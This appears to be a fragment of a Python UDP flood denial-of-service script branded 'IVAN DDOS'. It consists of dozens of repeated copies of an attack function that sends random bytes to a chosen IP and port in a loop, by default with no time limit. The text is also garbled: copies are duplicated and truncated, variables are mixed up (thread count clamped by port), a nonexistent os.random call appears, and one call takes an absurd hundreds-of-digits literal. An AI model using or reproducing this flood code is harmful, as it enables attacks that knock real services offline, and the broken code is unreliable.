    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
